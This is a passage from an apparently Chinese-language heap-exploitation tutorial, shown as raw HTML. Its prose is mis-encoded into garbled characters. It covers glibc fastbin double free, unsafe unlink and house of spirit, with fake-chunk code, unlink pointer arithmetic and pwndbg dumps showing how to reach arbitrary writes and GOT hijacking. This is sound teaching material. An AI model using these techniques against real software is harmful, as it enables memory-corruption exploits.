class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Allocated two fastbins: p1&#x3D;0x220a010 p2&#x3D;0x220a060</span><br><span class="line">Now free p1!</span><br><span class="line">Allocated large bin to trigger malloc_consolidate(): p3&#x3D;0x220a0b0</span><br><span class="line">In malloc_consolidate(), p1 is moved to the unsorted bin.</span><br><span class="line">Trigger the double free vulnerability!</span><br><span class="line">We can pass the check in malloc() since p1 is not fast top.</span><br><span class="line">Now p1 is in unsorted bin and fast bin. So we&#39;will get it twice: 0x220a010 0x220a010</span><br></pre></td></tr></table></figure><h3 id="0x05-unsafe-unlink"><a href="#0x05-unsafe-unlink" class="headerlink" title="0x05 unsafe_unlink"></a>0x05 unsafe_unlink</h3><p>Exploiting free on a corrupted chunk to get arbitrary write. </p><p>åˆ©ç”¨ free æ”¹å†™å…¨å±€æŒ‡é’ˆ chunk0_ptr è¾¾åˆ°ä»»æ„å†…å­˜å†™çš„ç›®çš„ï¼Œå³ unsafe unlinkã€‚</p><p>é¦–å…ˆæˆ‘ä»¬åˆ›å»ºä¸¤ä¸ªchunk åˆ†åˆ«ä¸ºchunk_0 å’Œchunk_1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; x/40gx 0x603000-0x10</span><br><span class="line">0x602ff0:0x00000000000000000x0000000000000000</span><br><span class="line">0x603000:0x00000000000000000x0000000000000091            &lt;- chunk 0</span><br><span class="line">0x603020:0x00000000000000000x0000000000000000</span><br><span class="line">0x603030:0x00000000000000000x0000000000000000</span><br><span class="line">0x603040:0x00000000000000000x0000000000000000</span><br><span class="line">0x603050:0x00000000000000000x0000000000000000</span><br><span class="line">0x603060:0x00000000000000000x0000000000000000</span><br><span class="line">0x603070:0x00000000000000000x0000000000000000</span><br><span class="line">0x603080:0x00000000000000000x0000000000000000</span><br><span class="line">0x603090:0x00000000000000000x0000000000000091            &lt;- chunk 1</span><br><span class="line">0x6030a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x603100:0x00000000000000000x0000000000000000</span><br><span class="line">0x603110:0x00000000000000000x0000000000000000</span><br><span class="line">0x603120:0x00000000000000000x0000000000020ee1</span><br></pre></td></tr></table></figure><p>ç´§æ¥ç€æˆ‘ä»¬å‡è®¾è¿™ä¸ªæ—¶å€™æˆ‘ä»¬æœ‰å †æº¢å‡ºï¼Œå¯ä»¥å¯¹chunk 0 è¿›è¡Œä¿®æ”¹ï¼Œæˆ‘ä»¬ä¼ªé€ ä¸ªchunkã€‚ç”±äºæœ‰<code>P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P)</code> è¿™æ ·çš„æ£€æŸ¥ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å…¨å±€æŒ‡é’ˆÂ <code>chunk0_ptr</code>Â æ„é€  fake chunk æ¥ç»•è¿‡å®ƒï¼š</p><p>æˆ‘ä»¬ä¼ªé€  fake chunk çš„fd ä¸º <code>chunk0_ptr[2] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*3);</code></p><p>æˆ‘ä»¬ä¼ªé€  fake chunk çš„bk ä¸º<code>chunk0_ptr[3] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*2);</code></p><p>è¿™ä¸ªæ—¶å€™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; x/40gx 0x603000-0x10</span><br><span class="line">0x602ff0:0x00000000000000000x0000000000000000</span><br><span class="line">0x603000:0x00000000000000000x0000000000000091   &lt;-- chunk 0</span><br><span class="line">0x603010:0x00000000000000000x0000000000000000   &lt;-- fake chunk</span><br><span class="line">0x603020:0x00000000006020580x0000000000602060        fd ,bk</span><br><span class="line">0x603030:0x00000000000000000x0000000000000000</span><br><span class="line">0x603040:0x00000000000000000x0000000000000000</span><br><span class="line">0x603050:0x00000000000000000x0000000000000000</span><br><span class="line">0x603060:0x00000000000000000x0000000000000000</span><br><span class="line">0x603070:0x00000000000000000x0000000000000000</span><br><span class="line">0x603080:0x00000000000000000x0000000000000000</span><br><span class="line">0x603090:0x00000000000000000x0000000000000091    &lt;-- chunk 1 &lt;-- prev_size</span><br><span class="line">0x6030a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x603100:0x00000000000000000x0000000000000000</span><br><span class="line">0x603110:0x00000000000000000x0000000000000000</span><br><span class="line">0x603120:0x00000000000000000x0000000000020ee1</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; x/5gx 0x0000000000602058</span><br><span class="line">0x602058:0x00000000000000000x00007ffff7dd2520               &lt;-- fake chunk FD</span><br><span class="line">0x602068 &lt;completed.7557&gt;:0x00000000000000000x0000000000603010 &lt;-- bk pointer</span><br><span class="line">0x602078:0x0000000000000000</span><br><span class="line">Pwndbg&gt; x/5gx 0x0000000000602060</span><br><span class="line">0x602060 &lt;stderr@@GLIBC_2.2.5&gt;:0x00007ffff7dd25200x0000000000000000 &lt;-- fake chunk BK</span><br><span class="line">0x602070 &lt;chunk0_ptr&gt;:0x00000000006030100x0000000000000000  &lt;-- fd pointer</span><br><span class="line">0x602080:0x0000000000000000</span><br><span class="line">Pwndbg&gt; heap</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å°±ä¼šå˜æˆæˆ‘ fake chunk çš„ FD å—çš„bkæŒ‡å‘ fake chunkï¼Œ fake chunk çš„BK å— çš„fdæŒ‡å‘fake chunk ï¼Œè¿™æ ·å°±èƒ½ç»•è¿‡æ£€æŸ¥ã€‚</p><p>å¦å¤–åˆ©ç”¨ chunk0 çš„æº¢å‡ºæ¼æ´ï¼Œé€šè¿‡ä¿®æ”¹ chunk 1 çš„Â <code>prev_size</code>Â ä¸º fake chunk çš„å¤§å°ï¼Œä¿®æ”¹Â <code>PREV_INUSE</code>Â æ ‡å¿—ä½ä¸º 0ï¼Œå°† fake chunk ä¼ªé€ æˆä¸€ä¸ª free chunkã€‚</p><hr><p>libc ä½¿ç”¨ size åŸŸçš„æœ€ä½ 3 ä½æ¥ å­˜å‚¨ä¸€äº›å…¶å®ƒä¿¡æ¯ã€‚ç›¸å…³çš„æ©ç ä¿¡æ¯å®šä¹‰å¦‚ä¸‹: </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_INUSE 0x1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_MMAPPED 0x2 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NON_MAIN_ARENA 0x4</span></span><br></pre></td></tr></table></figure><p>ä»ä»¥ä¸Šä»£ç å®šä¹‰å¯ä»¥æ¨æ–­, sizeåŸŸçš„æœ€ä½ä½è¡¨ç¤º æ­¤å—çš„ä¸Šä¸€å—(è¡¨ç¤ºè¿ç»­å†…å­˜ä¸­çš„ä¸Šä¸€å—)æ˜¯å¦åœ¨ä½¿ ç”¨çŠ¶æ€, å¦‚æœæ­¤ä½ä¸º 0 åˆ™è¡¨ç¤ºä¸Šä¸€å—ä¸ºè¢«é‡Šæ”¾çš„å—, è¿™ä¸ªæ—¶å€™æ­¤å—çš„ PREV_SIZE åŸŸä¿å­˜çš„æ˜¯ä¸Šä¸€å—çš„åœ° å€ä»¥ä¾¿åœ¨ free æ­¤å—æ—¶èƒ½å¤Ÿæ‰¾åˆ°ä¸Šä¸€å—çš„åœ°å€å¹¶è¿›è¡Œ åˆå¹¶æ“ä½œã€‚ç¬¬ 2 ä½è¡¨ç¤ºæ­¤å—æ˜¯å¦ç”± mmap åˆ†é…, å¦‚æœ æ­¤ä½ä¸º 0 åˆ™æ­¤å—æ˜¯ç”± top chunk åˆ†è£‚å¾—æ¥, å¦åˆ™æ˜¯ç”± mmap å•ç‹¬åˆ†é…è€Œæ¥ã€‚ç¬¬ 3 ä½è¡¨ç¤ºæ­¤å—æ˜¯å¦ä¸å±äº main_arena </p><hr><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; x/40gx 0x603000-0x10</span><br><span class="line">0x602ff0:0x00000000000000000x0000000000000000</span><br><span class="line">0x603000:0x00000000000000000x0000000000000091</span><br><span class="line">0x603010:0x00000000000000000x0000000000000000</span><br><span class="line">0x603020:0x00000000006020580x0000000000602060</span><br><span class="line">0x603030:0x00000000000000000x0000000000000000</span><br><span class="line">0x603040:0x00000000000000000x0000000000000000</span><br><span class="line">0x603050:0x00000000000000000x0000000000000000</span><br><span class="line">0x603060:0x00000000000000000x0000000000000000</span><br><span class="line">0x603070:0x00000000000000000x0000000000000000</span><br><span class="line">0x603080:0x00000000000000000x0000000000000000</span><br><span class="line">0x603090:0x00000000000000800x0000000000000090</span><br><span class="line">0x6030a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x603100:0x00000000000000000x0000000000000000</span><br><span class="line">0x603110:0x00000000000000000x0000000000000000</span><br><span class="line">0x603120:0x00000000000000000x0000000000020ee1</span><br></pre></td></tr></table></figure><p>è¿™æ ·ï¼Œæˆ‘ä»¬å»free chunk1ï¼Œè¿™ä¸ªæ—¶å€™ç³»ç»Ÿä¼šæ£€æµ‹åˆ° fake chunkæ˜¯é‡Šæ”¾çŠ¶æ€ï¼Œä¼šè§¦å‘ unlink ï¼Œfake chunkä¼šå‘ååˆå¹¶ï¼Œ chunk0ä¼šè¢«åå¹¶ã€‚</p><p>unlink çš„æ“ä½œå¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FD = P-&gt;fd;</span><br><span class="line">BK = P-&gt;bk;</span><br><span class="line">FD-&gt;bk = BK</span><br><span class="line">BK-&gt;fd = FD</span><br></pre></td></tr></table></figure><p>æ ¹æ® fd å’Œ bk æŒ‡é’ˆåœ¨ malloc_chunk ç»“æ„ä½“ä¸­çš„ä½ç½®ï¼Œè¿™æ®µä»£ç ç­‰ä»·äºï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FD = P-&gt;fd = &amp;P - 24</span><br><span class="line">BK = P-&gt;bk = &amp;P - 16</span><br><span class="line">FD-&gt;bk = *(&amp;P - 24 + 24) = P</span><br><span class="line">BK-&gt;fd = *(&amp;P - 16 + 16) = P</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±é€šè¿‡äº† unlink çš„æ£€æŸ¥ï¼Œæœ€ç»ˆæ•ˆæœä¸ºï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD-&gt;bk = P = BK = &amp;P - 16</span><br><span class="line">BK-&gt;fd = P = FD = &amp;P - 24</span><br></pre></td></tr></table></figure><p>æœ€ååŸæœ¬æŒ‡å‘å †ä¸Š fake chunk çš„æŒ‡é’ˆ P æŒ‡å‘äº†è‡ªèº«åœ°å€å‡ 24 çš„ä½ç½®,è¿™å°±æ„å‘³ç€å¦‚æœæˆ‘ä»¬èƒ½å¯¹å †Pè¿›è¡Œå†™å…¥ï¼Œåˆ™å°±æœ‰äº†ä»»æ„å†…å­˜å†™ã€‚å¦‚æœæˆ‘ä»¬èƒ½å¯¹å †Pè¿›è¡Œè¯»å–ï¼Œåˆ™å°±æœ‰äº†ä¿¡æ¯æ³„éœ²ã€‚</p><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæœ€åchunk0_ptr å’Œchunk0_ptr[3] æŒ‡å‘çš„åœ°æ–¹æ˜¯ä¸€æ ·çš„ã€‚ç›¸å¯¹æˆ‘ä»¬å¦‚æœå¯¹chunk0_ptr[3]ä¿®æ”¹ï¼Œä¹Ÿæ˜¯å¯¹chunk0_ptrè¿›è¡Œäº†ä¿®æ”¹ã€‚</p><p>åœ¨ç¨‹åºä¸­ï¼Œç¨‹åºå…ˆå¯¹chunk0_ptr[3]è¿›è¡Œäº†ä¿®æ”¹ï¼Œè®©å®ƒæŒ‡å‘äº†<code>victim_string</code> å­—ç¬¦ä¸²çš„æŒ‡é’ˆã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">50</span> <span class="built_in">strcpy</span>(victim_string,<span class="string">&quot;Hello!~&quot;</span>);</span><br><span class="line">â–º <span class="number">51</span> chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br></pre></td></tr></table></figure><p>ï¼ˆå¦‚æœè¿™ä¸ªåœ°å€æ˜¯ got è¡¨åœ°å€ï¼Œæˆ‘ä»¬ç´§æ¥ç€å°±å¯ä»¥ è¿›è¡Œ åŠ«æŒ got çš„æ“ä½œã€‚ï¼‰  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; x/40gx 0x603000</span><br><span class="line">0x603000:0x00000000000000000x0000000000000091</span><br><span class="line">0x603010:0x00000000000000000x0000000000000000</span><br><span class="line">0x603020:0x00000000006020580x00007fffffffe3d0</span><br><span class="line">0x603030:0x00000000000000000x0000000000000000</span><br><span class="line">0x603040:0x00000000000000000x0000000000000000</span><br><span class="line">0x603050:0x00000000000000000x0000000000000000</span><br><span class="line">0x603060:0x00000000000000000x0000000000000000</span><br><span class="line">0x603070:0x00000000000000000x0000000000000000</span><br><span class="line">0x603080:0x00000000000000000x0000000000000000</span><br><span class="line">0x603090:0x00000000000000800x0000000000000090</span><br><span class="line">0x6030a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x603100:0x00000000000000000x0000000000000000</span><br><span class="line">0x603110:0x00000000000000000x0000000000000000</span><br><span class="line">0x603120:0x00000000000000000x0000000000020ee1</span><br><span class="line">0x603130:0x00000000000000000x0000000000000000</span><br><span class="line">Pwndbg&gt; p chunk0_ptr</span><br><span class="line"><span class="variable">$8</span> = (uint64_t *) 0x603010</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬å¯¹<strong>chunk0_ptr</strong> è¿›è¡Œæ“ä½œï¼Œå°±èƒ½å¾—åˆ°ä¸€ä¸ªåœ°å€å†™ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; x/40gx 0x603000</span><br><span class="line">0x603000:0x00000000000000000x0000000000000091</span><br><span class="line">0x603010:0x41414141424242420x0000000000000000</span><br><span class="line">0x603020:0x00000000006020580x00007fffffffe3d0</span><br><span class="line">0x603030:0x00000000000000000x0000000000000000</span><br><span class="line">0x603040:0x00000000000000000x0000000000000000</span><br><span class="line">0x603050:0x00000000000000000x0000000000000000</span><br><span class="line">0x603060:0x00000000000000000x0000000000000000</span><br><span class="line">0x603070:0x00000000000000000x0000000000000000</span><br><span class="line">0x603080:0x00000000000000000x0000000000000000</span><br><span class="line">0x603090:0x00000000000000800x0000000000000090</span><br><span class="line">0x6030a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x603100:0x00000000000000000x0000000000000000</span><br><span class="line">0x603110:0x00000000000000000x0000000000000000</span><br><span class="line">0x603120:0x00000000000000000x0000000000020ee1</span><br><span class="line">0x603130:0x00000000000000000x0000000000000000</span><br><span class="line">Pwndbg&gt; x/gx chunk0_ptr</span><br><span class="line">0x603010:0x4141414142424242</span><br><span class="line">Pwndbg&gt;</span><br></pre></td></tr></table></figure><p>æ€»ç»“ä¸‹ï¼Œå¦‚æœæˆ‘ä»¬æ‰¾åˆ°ä¸€ä¸ªå…¨å±€æŒ‡é’ˆï¼Œé€šè¿‡unlinkçš„æ‰‹æ®µï¼Œæˆ‘ä»¬å°±æ„é€ ä¸€ä¸ªchunkæŒ‡å‘è¿™ä¸ªæŒ‡é’ˆæ‰€æŒ‡å‘çš„ä½ç½®ï¼Œç„¶åé€šè¿‡å¯¹chunkçš„æ“ä½œæ¥è¿›è¡Œè¯»å†™æ“ä½œã€‚</p><h3 id="0x06-house-of-spirit"><a href="#0x06-house-of-spirit" class="headerlink" title="0x06 house_of_spirit"></a>0x06 house_of_spirit</h3><p>Frees a fake fastbin chunk to get malloc to return a nearly-arbitrary pointer. </p><p>é€šè¿‡æ„é€  fake chunkï¼Œç„¶åå°†å…¶ free æ‰ï¼Œå°±å¯ä»¥åœ¨ä¸‹ä¸€æ¬¡ malloc æ—¶è¿”å› fake chunk çš„åœ°å€ã€‚</p><p><strong>house of spirit</strong> é€šå¸¸ç”¨æ¥é…åˆæ ˆæº¢å‡ºä½¿ç”¨,é€šå¸¸åœºæ™¯æ˜¯ï¼Œæ ˆæº¢å‡ºæ— æ³•è¦†ç›–åˆ°çš„ EIP ï¼Œè€Œæ°å¥½æ ˆä¸­æœ‰ä¸€ä¸ªå³å°†è¢« free çš„å †æŒ‡é’ˆã€‚æˆ‘ä»¬é€šè¿‡åœ¨æ ˆä¸Š fake ä¸€ä¸ªfastbin chunk æ¥ç€åœ¨ free æ“ä½œæ—¶ï¼Œè¿™ä¸ªæ ˆä¸Šçš„å †å—è¢«æ”¾åˆ° fast bin ä¸­ï¼Œä¸‹ä¸€æ¬¡ malloc å¯¹åº”çš„å¤§å°æ—¶ï¼Œç”±äº fast bin çš„å…ˆè¿›åå‡ºæœºåˆ¶ï¼Œè¿™ä¸ªæ ˆä¸Šçš„å †å—è¢«è¿”å›ç»™ç”¨æˆ·ï¼Œå†æ¬¡å†™å…¥æ—¶å°±å¯èƒ½é€ æˆè¿”å›åœ°å€çš„æ”¹å†™ã€‚æ‰€ä»¥åˆ©ç”¨çš„ç¬¬ä¸€æ­¥ä¸æ˜¯å»æ§åˆ¶ä¸€ä¸ª chunkï¼Œè€Œæ˜¯æ§åˆ¶ä¼ ç»™ free å‡½æ•°çš„æŒ‡é’ˆï¼Œå°†å…¶æŒ‡å‘ä¸€ä¸ª fake chunkã€‚æ‰€ä»¥ fake chunk çš„ä¼ªé€ æ˜¯å…³é”®ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;</span>);</span><br><span class="line">       <span class="comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span></span><br><span class="line">fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¼ªé€ æƒ…å†µå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; p fake_chunks</span><br><span class="line">$<span class="number">4</span> = &#123;<span class="number">0xc2</span>, <span class="number">0x40</span>, <span class="number">0x7fffffffe3ae</span>, <span class="number">0x7ffff7ababe5</span>, <span class="number">0x1</span>, <span class="number">0x4008ed</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x4008a0</span>, <span class="number">0x1234</span>&#125;</span><br><span class="line">Pwndbg&gt; p &amp;fake_chunks</span><br><span class="line">$<span class="number">5</span> = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> (*)[<span class="number">10</span>]) <span class="number">0x7fffffffe370</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­ 0x40 æ˜¯chunk sizeï¼Œ0x1234 æ˜¯ nextsizeã€‚ä¼ªé€  chunk æ—¶éœ€è¦ç»•è¿‡ä¸€äº›æ£€æŸ¥ï¼Œé¦–å…ˆæ˜¯æ ‡å¿—ä½ï¼Œ<code>PREV_INUSE</code>Â ä½å¹¶ä¸å½±å“ free çš„è¿‡ç¨‹ï¼Œä½†Â <code>IS_MMAPPED</code>Â ä½å’ŒÂ <code>NON_MAIN_ARENA</code>Â ä½éƒ½è¦ä¸ºé›¶ã€‚å…¶æ¬¡ï¼Œåœ¨ 64 ä½ç³»ç»Ÿä¸­ fast chunk çš„å¤§å°è¦åœ¨ 32~128 å­—èŠ‚ä¹‹é—´ã€‚æœ€åï¼Œæ˜¯ next chunk çš„å¤§å°ï¼Œå¿…é¡»å¤§äºÂ <code>2*SIZE_SZ</code>ï¼ˆå³å¤§äº16ï¼‰ï¼Œå°äºÂ <code>av-&gt;system_mem</code>ï¼ˆå³å°äº128kbï¼‰ï¼Œæ‰èƒ½ç»•è¿‡å¯¹ next chunk å¤§å°çš„æ£€æŸ¥ã€‚</p><hr><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_INUSE 0x1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_MMAPPED 0x2 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NON_MAIN_ARENA 0x4</span></span><br></pre></td></tr></table></figure><p>sizeåŸŸçš„æœ€ä½ä½è¡¨ç¤º æ­¤å—çš„ä¸Šä¸€å—(è¡¨ç¤ºè¿ç»­å†…å­˜ä¸­çš„ä¸Šä¸€å—)æ˜¯å¦åœ¨ä½¿ ç”¨çŠ¶æ€, å¦‚æœæ­¤ä½ä¸º 0 åˆ™è¡¨ç¤ºä¸Šä¸€å—ä¸ºè¢«é‡Šæ”¾çš„å—, è¿™ä¸ªæ—¶å€™æ­¤å—çš„ PREV_SIZE åŸŸä¿å­˜çš„æ˜¯ä¸Šä¸€å—çš„åœ° å€ä»¥ä¾¿åœ¨ free æ­¤å—æ—¶èƒ½å¤Ÿæ‰¾åˆ°ä¸Šä¸€å—çš„åœ°å€å¹¶è¿›è¡Œ åˆå¹¶æ“ä½œã€‚ç¬¬ 2 ä½è¡¨ç¤ºæ­¤å—æ˜¯å¦ç”± mmap åˆ†é…, å¦‚æœ æ­¤ä½ä¸º 0 åˆ™æ­¤å—æ˜¯ç”± top chunk åˆ†è£‚å¾—æ¥, å¦åˆ™æ˜¯ç”± mmap å•ç‹¬åˆ†é…è€Œæ¥ã€‚ç¬¬ 3 ä½è¡¨ç¤ºæ­¤å—æ˜¯å¦ä¸å±äº main_arena, åœ¨ä¹‹åä¼šæåˆ°main_arenaæ˜¯ä¸»çº¿ç¨‹ç”¨äºä¿å­˜å †çŠ¶æ€çš„ç»“æ„, å¦‚æœæ­¤ä½ä¸º 0 åˆ™è¡¨ç¤ºæ­¤å—æ˜¯åœ¨ ä¸»çº¿ç¨‹ä¸­åˆ†é…çš„  </p><hr><p>ç„¶åæˆ‘ä»¬ä¿®æ”¹æŒ‡é’ˆ a  æŒ‡å‘fake chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">23</span>         <span class="comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span></span><br><span class="line">  <span class="number">24</span> fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line">  <span class="number">25</span></span><br><span class="line">  <span class="number">26</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">  <span class="number">27</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line">â–º <span class="number">28</span> a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line">  <span class="number">29</span></span><br><span class="line">  <span class="number">30</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">  <span class="number">31</span> <span class="built_in">free</span>(a);</span><br><span class="line">  <span class="number">32</span></span><br><span class="line">  <span class="number">33</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹åå¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td 